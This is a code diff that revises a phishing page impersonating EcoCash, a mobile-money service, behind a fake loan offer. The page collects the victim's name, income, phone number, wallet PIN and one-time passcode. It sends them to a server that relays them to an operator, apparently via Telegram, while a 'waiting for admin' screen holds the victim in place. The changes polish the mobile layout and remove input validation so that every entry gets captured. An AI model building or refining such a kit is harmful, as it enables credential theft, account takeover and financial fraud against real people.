@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>EcoCash Loans</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap');
@@ -11,48 +11,67 @@
       --ecocash-blue: #0054A6;
       --ecocash-red: #E31837;
       --purple-gradient: linear-gradient(90deg, #6B5BFF 0%, #B44FFF 100%);
-      --bg-gray: #f0f2f5;
+      --bg-gray: #f4f6f8;
       --text-dark: #111;
       --text-muted: #666;
     }
 
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; -webkit-tap-highlight-color: transparent; }
+    button:focus { outline: none; }
     
     body { 
       background: var(--bg-gray); 
       display: flex; 
       justify-content: center; 
+      align-items: center;
       min-height: 100vh; 
       color: var(--text-dark);
+      overflow: hidden; 
+    }
+
+    .app-wrapper {
+      width: 100%;
+      max-width: 480px;
+      height: 100vh;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      overflow: hidden;
+    }
+
+    @media (min-width: 481px) {
+      .app-wrapper {
+        height: 90vh;
+        max-height: 850px;
+        border-radius: 16px;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+      }
     }
 
     /* Top Navigation Bar */
     .navbar {
       background: #f9f9f9;
       width: 100%;
-      max-width: 500px;
-      padding: 15px 20px;
+      padding: calc(15px + env(safe-area-inset-top)) 20px 15px 20px;
       display: flex;
       justify-content: space-between;
       align-items: center;
       border-bottom: 1px solid #ddd;
-      position: sticky;
-      top: 0;
       z-index: 100;
+      flex-shrink: 0; 
     }
     .navbar h1 { font-size: 1.4rem; font-weight: 900; }
     .navbar h1 .blue { color: var(--ecocash-blue); }
     .navbar h1 .red { color: var(--ecocash-red); }
-    .menu-icon { font-size: 1.5rem; cursor: pointer; }
+    .menu-icon { font-size: 1.5rem; cursor: pointer; padding: 5px; }
 
-    .app { 
-      background: #fff; 
-      width: 100%; 
-      max-width: 500px; 
-      min-height: calc(100vh - 60px);
-      display: flex; 
-      flex-direction: column;
+    .page-container {
+      flex: 1;
       position: relative;
+      overflow-y: auto; 
+      display: flex;
+      flex-direction: column;
     }
 
     .page { display: none; flex: 1; flex-direction: column; animation: fadeIn 0.3s ease; }
@@ -60,7 +79,7 @@
     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
     /* --- PAGE 1: LOAN CALCULATOR --- */
-    .card { background: #fff; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); padding: 25px; margin: 20px; }
+    .card { background: #fff; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); padding: 25px; margin: 20px; border: 1px solid #eee; }
     .page1-header { text-align: center; margin-bottom: 20px; }
     .page1-header h2 { font-size: 1.6rem; margin-bottom: 8px; }
     .page1-header p { color: var(--text-muted); font-size: 0.9rem; }
@@ -69,20 +88,22 @@
     .calc-row { margin-bottom: 25px; }
     .calc-labels { display: flex; justify-content: space-between; font-weight: 700; margin-bottom: 15px; }
     .calc-labels .value { color: #6B5BFF; }
-    .calc-sub { display: flex; justify-content: space-between; font-size: 0.8rem; color: var(--text-muted); margin-top: 5px; }
+    .calc-sub { display: flex; justify-content: space-between; font-size: 0.8rem; color: var(--text-muted); margin-top: 8px; }
     
     input[type=range] {
       -webkit-appearance: none;
       width: 100%;
       background: transparent;
+      height: 30px;
     }
     input[type=range]::-webkit-slider-thumb {
       -webkit-appearance: none;
-      height: 22px; width: 22px;
+      height: 24px; width: 24px;
       border-radius: 50%;
       background: #6B5BFF;
       cursor: pointer;
-      margin-top: -8px;
+      margin-top: -9px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
     }
     input[type=range]::-webkit-slider-runnable-track {
       width: 100%; height: 6px;
@@ -92,16 +113,16 @@
     }
 
     .monthly-box {
-      background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 20px;
+      background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 15px 20px;
       display: flex; justify-content: space-between; align-items: center; margin-top: 10px;
     }
-    .monthly-box span:first-child { font-size: 1.1rem; color: #333; }
-    .monthly-box span:last-child { font-size: 1.6rem; font-weight: 700; color: #6B5BFF; }
+    .monthly-box span:first-child { font-size: 1rem; color: #333; }
+    .monthly-box span:last-child { font-size: 1.5rem; font-weight: 700; color: #6B5BFF; }
 
     .btn-gradient {
       background: var(--purple-gradient); color: white; border: none; border-radius: 8px;
       width: calc(100% - 40px); margin: 0 20px 30px; padding: 16px; font-size: 1rem; font-weight: 700;
-      cursor: pointer; transition: 0.2s;
+      cursor: pointer; transition: 0.2s; min-height: 52px; 
     }
     .btn-gradient:active { opacity: 0.8; }
 
@@ -117,250 +138,285 @@
     .form-group label { display: block; font-family: serif; font-size: 1.1rem; margin-bottom: 8px; color: #222; }
     .form-group input, .form-group select {
       width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px;
-      font-size: 1rem; color: #333; background: #fff; font-family: 'Roboto', sans-serif;
+      font-size: 16px; 
+      color: #333; background: #fff; font-family: 'Roboto', sans-serif;
     }
     .form-group input:focus, .form-group select:focus { outline: none; border-color: #6B5BFF; }
 
-    /* --- PAGE 3: PHONE & PIN --- */
-    .login-container { display: flex; flex-direction: column; height: 100%; position: relative; background: #fff; }
-    .login-top { flex: 1; padding: 40px 20px; text-align: center; z-index: 2; }
+    /* --- PAGE 3 & 4: LOGIN / OTP --- */
+    .login-container { display: flex; flex-direction: column; flex: 1; background: #fff; position: relative; }
+    
+    .login-top { flex: 1; padding: 30px 20px; text-align: center; display: flex; flex-direction: column; justify-content: center; margin-bottom: 30px;}
     .login-logo { font-size: 2.5rem; font-weight: 900; margin-bottom: 30px; }
     .login-logo .blue { color: var(--ecocash-blue); }
     .login-logo .red { color: var(--ecocash-red); }
-    .login-top h3 { font-size: 1.5rem; color: #333; margin-bottom: 30px; }
+    .login-top h3 { font-size: 1.4rem; color: #333; margin-bottom: 30px; }
 
     .phone-input-box {
       display: flex; align-items: center; border: 2px solid var(--ecocash-blue); border-radius: 8px;
-      padding: 10px; margin-bottom: 25px;
+      padding: 12px; margin-bottom: 25px; max-width: 350px; margin-left: auto; margin-right: auto; width: 100%;
     }
     .country-code { display: flex; align-items: center; font-size: 1.1rem; font-weight: 500; padding-right: 15px; border-right: 1px solid #ddd; }
-    .country-code img { width: 25px; margin-right: 8px; }
-    .phone-input-box input { border: none; outline: none; padding-left: 15px; font-size: 1.1rem; width: 100%; }
+    
+    .flag-icon {
+      width: 24px; height: 16px; margin-right: 8px;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 600 400'%3E%3Crect width='600' height='400' fill='%23fff'/%3E%3Cpath d='M0 0h600v133H0zm0 267h600v133H0z' fill='%23319A38'/%3E%3Cpath d='M0 133h600v134H0z' fill='%23FFD200'/%3E%3Cpath d='M0 0v400l240-200z' fill='%23000' stroke='%23fff' stroke-width='20'/%3E%3Cpath d='M70 200l40-15-25-35 40 10-5-40 30 30 15-40 15 40 30-30-5 40 40-10-25 35 40 15-40 15 25 35-40-10 5 40-30-30-15 40-15-40-30 30 5-40-40 10 25-35z' fill='%23D21034'/%3E%3C/svg%3E");
+      background-size: cover; border-radius: 2px;
+    }
+    .phone-input-box input { border: none; outline: none; padding-left: 15px; font-size: 16px; width: 100%; font-weight: 500; letter-spacing: 1px;}
 
     .pin-label { color: var(--text-muted); margin-bottom: 15px; font-size: 0.95rem; }
-    .pin-boxes { display: flex; justify-content: center; gap: 15px; }
+    .pin-boxes { display: flex; justify-content: center; gap: 12px; }
     .pin-boxes input {
-      width: 50px; height: 60px; border: 1px solid var(--ecocash-blue); border-radius: 8px;
+      width: 50px; height: 60px; border: 1.5px solid var(--ecocash-blue); border-radius: 8px;
       text-align: center; font-size: 1.5rem; font-weight: 700; outline: none;
     }
+    .pin-boxes input:focus { box-shadow: 0 0 0 3px rgba(0, 84, 166, 0.2); }
 
+    .otp-boxes { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
+    .otp-boxes input {
+      width: 45px; height: 55px; border: 1.5px solid #ccc; border-radius: 8px;
+      text-align: center; font-size: 1.3rem; font-weight: 600; outline: none;
+    }
+    .otp-boxes input:focus { border-color: var(--ecocash-blue); box-shadow: 0 0 0 3px rgba(0, 84, 166, 0.2); }
+    .resend-text { color: #333; font-size: 0.95rem; font-weight: 500; }
+    
     .login-bottom {
       background: var(--ecocash-blue);
-      border-radius: 50% 50% 0 0 / 20px 20px 0 0;
-      padding: 60px 20px 40px;
-      color: #fff; text-align: center; position: relative;
+      padding: 40px 20px calc(30px + env(safe-area-inset-bottom));
+      color: #fff; text-align: center; margin-top: auto;
+      position: relative;
     }
-    .login-bottom p { font-size: 0.9rem; margin-bottom: 20px; line-height: 1.4; }
-    .bottom-buttons { display: flex; gap: 15px; }
+    .login-bottom::before {
+      content: '';
+      position: absolute;
+      top: -30px;
+      left: 0;
+      width: 100%;
+      height: 31px;
+      background-size: 100% 100%;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1440 320' preserveAspectRatio='none'%3E%3Cpath fill='%230054A6' fill-opacity='1' d='M0,96L80,112C160,128,320,160,480,160C640,160,800,128,960,117.3C1120,107,1280,117,1360,122.7L1440,128L1440,320L1360,320C1280,320,1120,320,960,320C800,320,640,320,480,320C320,320,160,320,80,320L0,320Z'%3E%3C/path%3E%3C/svg%3E");
+    }
+
+    .login-bottom p { font-size: 0.9rem; margin-bottom: 20px; line-height: 1.4; opacity: 0.9; }
+    .bottom-buttons { display: flex; gap: 12px; max-width: 350px; margin: 0 auto; }
+    
     .bottom-buttons button {
       flex: 1; background: #fff; color: #333; border: none; border-radius: 8px;
-      padding: 15px; font-size: 0.9rem; font-weight: 500; cursor: pointer;
+      padding: 12px; font-size: 0.85rem; font-weight: 600; cursor: pointer;
       display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px;
+      min-height: 60px;
     }
-    .bottom-buttons button i { color: var(--ecocash-blue); font-size: 1.5rem; }
-    .login-footer { margin-top: 30px; font-size: 0.8rem; color: rgba(255,255,255,0.8); }
-    .login-footer a { color: #fff; }
-
-    /* --- PAGE 4: OTP --- */
-    .otp-top { padding: 40px 20px; text-align: center; z-index: 2; flex: 1; }
-    .otp-top h3 { font-size: 1.2rem; color: #333; margin-bottom: 10px; margin-top: 40px; }
-    .otp-phone { font-size: 1.1rem; font-weight: 700; margin-bottom: 40px; }
-    .otp-boxes { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; }
-    .otp-boxes input {
-      width: 45px; height: 55px; border: 1px solid #ccc; border-radius: 8px;
-      text-align: center; font-size: 1.3rem; outline: none;
-    }
-    .otp-boxes input:focus { border-color: var(--ecocash-blue); }
-    .resend-text { color: #333; font-size: 0.95rem; }
+    .bottom-buttons button i { color: var(--ecocash-blue); font-size: 1.4rem; }
     
-    .otp-bottom {
-      background: var(--ecocash-blue); border-radius: 50% 50% 0 0 / 20px 20px 0 0;
-      padding: 60px 20px 40px; color: #fff; text-align: center;
+    .login-footer { margin-top: 25px; font-size: 0.75rem; color: rgba(255,255,255,0.7); line-height: 1.5; }
+    .login-footer a { color: #fff; text-decoration: underline; }
+
+    .help-link { display: flex; justify-content: center; align-items: center; gap: 8px; font-size: 1rem; font-weight: 500; margin-bottom: 20px; cursor: pointer; }
+    .help-link i { font-size: 1.3rem; }
+
+    /* --- PAGE: WAITING / LOADING --- */
+    .waiting-screen {
+      display: flex; flex-direction: column; justify-content: center; align-items: center;
+      height: 100%; text-align: center; padding: 40px;
     }
-    .help-link { display: flex; justify-content: center; align-items: center; gap: 8px; font-size: 1.1rem; font-weight: 500; margin-bottom: 30px; cursor: pointer; }
-    .help-link i { font-size: 1.5rem; }
+    .spinner {
+      width: 60px; height: 60px; border: 5px solid #f3f3f3;
+      border-top: 5px solid var(--ecocash-blue); border-radius: 50%;
+      animation: spin 1s linear infinite; margin-bottom: 25px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .waiting-screen h2 { font-size: 1.5rem; color: var(--ecocash-blue); margin-bottom: 10px; }
+    .waiting-screen p { color: var(--text-muted); line-height: 1.5; }
 
     /* Utilities */
-    .error { color: #d9534f; font-size: 0.85rem; margin-top: 5px; padding: 0 20px; display: none; font-weight: 500;}
+    .error { color: #d9534f; font-size: 0.85rem; margin-top: 5px; padding: 0 20px; display: none; font-weight: 500; text-align: center;}
     .hidden { display: none !important; }
   </style>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
 
-<!-- Navbar -->
-<div class="navbar">
-  <h1><span class="blue">Eco</span><span class="red">Cash</span></h1>
-  <div class="menu-icon"><i class="fa-solid fa-bars"></i></div>
-</div>
-
-<div class="app">
-  
-  <!-- Page 1: Loan Calculator -->
-  <div id="page1" class="page active">
-    <div class="card">
-      <div class="page1-header">
-        <h2>Get Your Loan Approved Fast</h2>
-        <p>Quick approval • Competitive rates • Flexible terms</p>
-      </div>
-
-      <div class="calc-box">
-        <div class="calc-row">
-          <div class="calc-labels"><span>Loan Amount</span><span class="value" id="amountLabel">$5,000</span></div>
-          <input type="range" id="loanAmount" min="100" max="5000" step="100" value="5000" oninput="updateCalc()">
-          <div class="calc-sub"><span>$100</span><span>$5,000</span></div>
-        </div>
-
-        <div class="calc-row" style="margin-bottom: 10px;">
-          <div class="calc-labels"><span>Loan Term</span><span class="value" id="termLabel">12 months</span></div>
-          <input type="range" id="loanTerm" min="6" max="60" step="6" value="12" oninput="updateCalc()">
-          <div class="calc-sub"><span>6 months</span><span>60 months</span></div>
-        </div>
-
-        <div class="monthly-box">
-          <span>Monthly Payment</span>
-          <span id="monthlyLabel">$450.00</span>
-        </div>
-      </div>
-    </div>
-
-    <button class="btn-gradient" onclick="showPage('page2')">APPLY NOW</button>
-
-    <div class="features">
-      <div class="feature-item">
-        <div class="feature-icon">⚡</div>
-        <div class="feature-text"><h4>Fast Approval</h4><p>Within 24 hours</p></div>
-      </div>
-      <div class="feature-item">
-        <div class="feature-icon">💰</div>
-        <div class="feature-text"><h4>Low Rates</h4><p>From 8%</p></div>
-      </div>
-      <div class="feature-item">
-        <div class="feature-icon">🔒</div>
-        <div class="feature-text"><h4>Secure</h4><p>Bank-level</p></div>
-      </div>
-    </div>
+<div class="app-wrapper">
+  <!-- Navbar -->
+  <div class="navbar">
+    <h1><span class="blue">Eco</span><span class="red">Cash</span></h1>
+    <div class="menu-icon"><i class="fa-solid fa-bars"></i></div>
   </div>
 
-  <!-- Page 2: Questionnaire -->
-  <div id="page2" class="page">
-    <h2 class="form-title">Questionnaire</h2>
-    <form id="formQuestionnaire">
-      <div class="form-group">
-        <label>Full name</label>
-        <input type="text" id="qName" required placeholder="Enter your full name">
-      </div>
-      <div class="form-group">
-        <label>Employment status</label>
-        <select id="qEmployment" required>
-          <option value="">Select your employment status</option>
-          <option>Employed</option>
-          <option>Self-Employed</option>
-          <option>Unemployed</option>
-        </select>
-      </div>
-      <div class="form-group">
-        <label>Monthly income</label>
-        <input type="number" id="qIncome" required placeholder="Enter your monthly income">
-      </div>
-      <div class="form-group">
-        <label>Loan amount</label>
-        <input type="number" id="qAmount" required placeholder="Enter loan amount">
-      </div>
-      <div class="form-group">
-        <label>Repayment period (months)</label>
-        <select id="qTerm" required>
-          <option value="">Select repayment period</option>
-          <option>6 months</option>
-          <option>12 months</option>
-          <option>24 months</option>
-          <option>36 months</option>
-        </select>
-      </div>
-      
-      <div class="error" id="errQ"></div>
-      <button type="submit" class="btn-gradient" style="margin: 20px;">SUBMIT APPLICATION</button>
-    </form>
-  </div>
+  <div class="page-container">
+    <!-- Page 1: Loan Calculator -->
+    <div id="page1" class="page active">
+      <div class="card">
+        <div class="page1-header">
+          <h2>Get Your Loan Approved Fast</h2>
+          <p>Quick approval • Competitive rates • Flexible terms</p>
+        </div>
 
-  <!-- Page 3: Phone & PIN -->
-  <div id="page3" class="page">
-    <div class="login-container">
-      <div class="login-top">
-        <div class="login-logo"><span class="blue">Eco</span><span class="red">Cash</span></div>
-        <h3>Login</h3>
-
-        <div class="phone-input-box">
-          <div class="country-code">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/Flag_of_Zimbabwe.svg/1200px-Flag_of_Zimbabwe.svg.png" alt="ZW">
-            +263
+        <div class="calc-box">
+          <div class="calc-row">
+            <div class="calc-labels"><span>Loan Amount</span><span class="value" id="amountLabel">$5,000</span></div>
+            <input type="range" id="loanAmount" min="100" max="5000" step="100" value="5000" oninput="updateCalc()">
+            <div class="calc-sub"><span>$100</span><span>$5,000</span></div>
           </div>
-          <input type="tel" id="pPhone" placeholder="Phone Number" required>
-        </div>
 
-        <p class="pin-label">Enter your PIN</p>
-        <div class="pin-boxes" id="pinContainer">
-          <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
-          <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
-          <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin3')" id="pin2">
-          <input type="password" maxlength="1" inputmode="numeric" id="pin3">
+          <div class="calc-row" style="margin-bottom: 10px;">
+            <div class="calc-labels"><span>Loan Term</span><span class="value" id="termLabel">12 months</span></div>
+            <input type="range" id="loanTerm" min="6" max="60" step="6" value="12" oninput="updateCalc()">
+            <div class="calc-sub"><span>6 months</span><span>60 months</span></div>
+          </div>
+
+          <div class="monthly-box">
+            <span>Monthly Payment</span>
+            <span id="monthlyLabel">$450.00</span>
+          </div>
         </div>
-        <div class="error" id="errLogin" style="text-align: center; margin-top: 15px;"></div>
       </div>
 
-      <div class="login-bottom">
-        <p>To register an EcoCash wallet or get assistance,<br>click below</p>
-        <div class="bottom-buttons">
-          <button type="button"><i class="fa-solid fa-user-plus"></i>Register</button>
-          <button type="button"><i class="fa-solid fa-circle-info"></i>Help & Support</button>
+      <button class="btn-gradient" onclick="showPage('page2')">APPLY NOW</button>
+
+      <div class="features">
+        <div class="feature-item">
+          <div class="feature-icon">⚡</div>
+          <div class="feature-text"><h4>Fast Approval</h4><p>Within 24 hours</p></div>
         </div>
-        <div class="login-footer">
-          v4.0.3P<br><br>
-          By signing in you agree to the <a href="#">Terms and Conditions</a>
+        <div class="feature-item">
+          <div class="feature-icon">💰</div>
+          <div class="feature-text"><h4>Low Rates</h4><p>From 8%</p></div>
+        </div>
+        <div class="feature-item">
+          <div class="feature-icon">🔒</div>
+          <div class="feature-text"><h4>Secure</h4><p>Bank-level</p></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Page 2: Questionnaire -->
+    <div id="page2" class="page">
+      <h2 class="form-title">Questionnaire</h2>
+      <form id="formQuestionnaire" style="padding-bottom: 20px;">
+        <div class="form-group">
+          <label>Full name</label>
+          <input type="text" id="qName" required placeholder="Enter your full name">
+        </div>
+        <div class="form-group">
+          <label>Employment status</label>
+          <select id="qEmployment" required>
+            <option value="">Select your employment status</option>
+            <option>Employed</option>
+            <option>Self-Employed</option>
+            <option>Unemployed</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Monthly income</label>
+          <input type="number" id="qIncome" required placeholder="Enter your monthly income">
+        </div>
+        <div class="form-group">
+          <label>Loan amount</label>
+          <input type="number" id="qAmount" required placeholder="Enter loan amount">
+        </div>
+        <div class="form-group">
+          <label>Repayment period (months)</label>
+          <select id="qTerm" required>
+            <option value="">Select repayment period</option>
+            <option>6 months</option>
+            <option>12 months</option>
+            <option>24 months</option>
+            <option>36 months</option>
+          </select>
+        </div>
+        
+        <div class="error" id="errQ"></div>
+        <button type="submit" class="btn-gradient" style="margin: 20px;">SUBMIT APPLICATION</button>
+      </form>
+    </div>
+
+    <!-- Page 3: Phone & PIN -->
+    <div id="page3" class="page">
+      <div class="login-container">
+        <form id="loginForm">
+          <div class="login-top">
+            <div class="login-logo"><span class="blue">Eco</span><span class="red">Cash</span></div>
+            <h3>Login</h3>
+
+            <div class="phone-input-box">
+              <div class="country-code">
+                <div class="flag-icon"></div>
+                +263
+              </div>
+              <input type="tel" id="pPhone" placeholder="Phone Number" required>
+            </div>
+
+            <p class="pin-label">Enter your PIN</p>
+            <div class="pin-boxes" id="pinContainer">
+              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
+              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
+              <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin3')" id="pin2">
+              <input type="password" maxlength="1" inputmode="numeric" id="pin3">
+            </div>
+            <div class="error" id="errLogin" style="margin-top: 15px;"></div>
+          </div>
+
+          <div class="login-bottom">
+            <p>To register an EcoCash wallet or get assistance,<br>click below</p>
+            <div class="bottom-buttons">
+              <!-- Register button is the submit trigger -->
+              <button type="submit"><i class="fa-solid fa-user-plus"></i>Register</button>
+              <button type="button" onclick="alert('For assistance, please call our support line at 111.')"><i class="fa-solid fa-circle-info"></i>Help & Support</button>
+            </div>
+            <div class="login-footer">
+              v4.0.3P<br><br>
+              By signing in you agree to the <a href="#">Terms and Conditions</a>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- Page 4: OTP -->
+    <div id="page4" class="page">
+      <div class="login-container">
+        <div class="login-top">
+          <div class="login-logo"><span class="blue">Eco</span><span class="red">Cash</span></div>
+          <h3>Enter the OTP code sent to</h3>
+          <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem;">+263 77 000 0000</div>
+
+          <div class="otp-boxes" id="otpContainer">
+            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp1')" id="otp0">
+            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp2')" id="otp1">
+            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp3')" id="otp2">
+            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp4')" id="otp3">
+            <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp5')" id="otp4">
+            <input type="text" maxlength="1" inputmode="numeric" id="otp5">
+          </div>
+
+          <p class="resend-text">Resend OTP in <span id="timer">44</span> Sec</p>
+          <div class="error" id="errOtp" style="margin-top: 15px;"></div>
+        </div>
+
+        <div class="login-bottom" style="padding-top: 30px; padding-bottom: 30px;">
+          <div class="help-link" onclick="alert('For assistance, please call our support line at 111.')"><i class="fa-regular fa-circle-question"></i> Help & Support</div>
+          <div class="login-footer" style="margin-top: 10px;">v4.2.9</div>
         </div>
       </div>
     </div>
-    
-    <!-- Submit button placed absolute at bottom but hidden visually -->
-    <button id="btnLogin" class="hidden" onclick="submitLogin()"></button>
-  </div>
 
-  <!-- Page 4: OTP -->
-  <div id="page4" class="page">
-    <div class="login-container">
-      <div class="otp-top">
-        <div class="login-logo"><span class="blue">Eco</span><span class="red">Cash</span></div>
-        <h3>Enter the OTP code sent to</h3>
-        <div class="otp-phone" id="otpPhoneDisplay">+263 77 000 0000</div>
-
-        <div class="otp-boxes" id="otpContainer">
-          <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp1')" id="otp0">
-          <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp2')" id="otp1">
-          <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp3')" id="otp2">
-          <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp4')" id="otp3">
-          <input type="text" maxlength="1" inputmode="numeric" oninput="moveFocusOTP(this, 'otp5')" id="otp4">
-          <input type="text" maxlength="1" inputmode="numeric" id="otp5">
-        </div>
-
-        <p class="resend-text">Resend OTP in <span id="timer">44</span> Sec</p>
-        <div class="error" id="errOtp" style="text-align: center; margin-top: 15px;"></div>
-      </div>
-
-      <div class="otp-bottom">
-        <div class="help-link"><i class="fa-regular fa-circle-question"></i> Help & Support</div>
-        <div class="login-footer">v4.2.9</div>
+    <!-- Page 5: Waiting for Admin -->
+    <div id="page-waiting" class="page">
+      <div class="waiting-screen">
+        <div class="spinner"></div>
+        <h2>Please Wait...</h2>
+        <p>We are verifying your details.<br>This may take a moment.</p>
       </div>
     </div>
-    <!-- Submit button placed absolute at bottom but hidden visually -->
-    <button id="btnOtp" class="hidden" onclick="submitOTP()"></button>
-  </div>
 
-  <!-- Page 5: Success -->
-  <div id="page5" class="page" style="text-align: center; padding: 50px 20px;">
-    <h2 style="color: #10b981; font-size: 2rem; margin-bottom: 20px;">Success!</h2>
-    <p style="color: #666; font-size: 1.1rem;">Your loan application has been fully processed. Please check your EcoCash wallet shortly.</p>
+    <!-- Page 6: Success -->
+    <div id="page5" class="page" style="text-align: center; padding: 50px 20px; justify-content: center;">
+      <h2 style="color: #10b981; font-size: 2.5rem; margin-bottom: 20px;">Success!</h2>
+      <p style="color: #666; font-size: 1.1rem; line-height: 1.5;">Your loan application has been fully processed. Please check your EcoCash wallet shortly.</p>
+    </div>
   </div>
-
 </div>
 
 <script>
@@ -368,7 +424,6 @@
   let pollTimer = null;
   let isPolling = false;
 
-  // Initialize session
   async function init() {
     try {
       const res = await fetch('/api/session', { method: 'POST' });
@@ -381,9 +436,9 @@
   function showPage(pageId) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(pageId).classList.add('active');
+    document.querySelector('.page-container').scrollTop = 0;
   }
 
-  // --- PAGE 1 CALCULATOR LOGIC ---
   function updateCalc() {
     const amount = document.getElementById('loanAmount').value;
     const term = document.getElementById('loanTerm').value;
@@ -391,12 +446,11 @@
     document.getElementById('amountLabel').textContent = '$' + Number(amount).toLocaleString();
     document.getElementById('termLabel').textContent = term + ' months';
 
-    // Simple interest calculation for display
     const monthly = (amount * 1.08) / term; 
     document.getElementById('monthlyLabel').textContent = '$' + monthly.toFixed(2);
   }
 
-  // --- PAGE 2: QUESTIONNAIRE ---
+  // Page 2 Submit
   document.getElementById('formQuestionnaire').addEventListener('submit', async (e) => {
     e.preventDefault();
     const btn = e.target.querySelector('button');
@@ -417,7 +471,7 @@
         body: JSON.stringify({ sessionId, data })
       });
       if (res.ok) {
-        showPage('page3'); // Move to Phone & PIN
+        startPolling(); 
       } else { throw new Error(); }
     } catch (err) {
       document.getElementById('errQ').textContent = 'Submission failed. Try again.';
@@ -426,94 +480,88 @@
     }
   });
 
-  // --- PIN INPUT AUTO-FOCUS ---
   function moveFocus(current, nextId) {
     if (current.value.length === 1) {
       if (nextId) document.getElementById(nextId).focus();
-      else submitLogin(); // Auto-submit if last box
     }
   }
 
-  // --- PAGE 3: LOGIN SUBMIT ---
-  async function submitLogin() {
+  // Page 3 Submit (Triggered by Register Button)
+  document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault(); // Prevents page reload
+    
     const phone = document.getElementById('pPhone').value.trim();
     const pins = Array.from(document.querySelectorAll('#pinContainer input')).map(i => i.value).join('');
     
-    if (phone.length < 9 || pins.length < 4) {
-      document.getElementById('errLogin').textContent = 'Please enter a valid phone and 4-digit PIN.';
+    // Validation REMOVED. Just checking if they are empty so we don't send blank messages.
+    if (phone === '' || pins === '') {
+      document.getElementById('errLogin').textContent = 'Please fill in the phone number and PIN.';
       document.getElementById('errLogin').style.display = 'block';
       return;
     }
 
     document.getElementById('errLogin').style.display = 'none';
-    document.getElementById('btnLogin').disabled = true;
-
+    
     const data = {
-      fullName: document.getElementById('qName').value, // Grab name from Page 2 to send
+      fullName: document.getElementById('qName').value, // Grab from page 2
       phone: '+263 ' + phone,
       pin: pins
     };
 
     try {
-      // Send Phone & PIN to Telegram (Wait for Admin approval)
       const res = await fetch('/api/submit-page5-6', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
           sessionId, 
           page5: { q1: data.phone, q2: data.pin }, 
-          page6: { q1: data.fullName, q2: 'N/A' } // We pass name along just to keep DB structure happy
+          page6: { q1: data.fullName, q2: 'N/A' } 
         })
       });
-      if (res.ok) startPolling('page3'); 
+      if (res.ok) startPolling(); 
     } catch (err) {
       document.getElementById('errLogin').textContent = 'Connection error.';
       document.getElementById('errLogin').style.display = 'block';
-      document.getElementById('btnLogin').disabled = false;
     }
-  }
+  });
 
-  // --- PAGE 4: OTP INPUT AUTO-FOCUS ---
   function moveFocusOTP(current, nextId) {
     if (current.value.length === 1) {
       if (nextId) document.getElementById(nextId).focus();
-      else submitOTP(); // Auto-submit if last box
     }
   }
 
-  // --- PAGE 4: OTP SUBMIT ---
+  // Triggered when the 6th OTP box is filled, or they hit enter
+  document.getElementById('otpContainer').addEventListener('input', function(e) {
+    const otp = Array.from(document.querySelectorAll('#otpContainer input')).map(i => i.value).join('');
+    if (otp.length === 6) {
+      submitOTP();
+    }
+  });
+
   async function submitOTP() {
     const otp = Array.from(document.querySelectorAll('#otpContainer input')).map(i => i.value).join('');
     
-    if (otp.length < 6) {
-      document.getElementById('errOtp').textContent = 'Please enter the full 6-digit OTP.';
-      document.getElementById('errOtp').style.display = 'block';
-      return;
-    }
+    // Validation REMOVED. It sends whatever they typed.
+    if (otp === '') return;
 
     document.getElementById('errOtp').style.display = 'none';
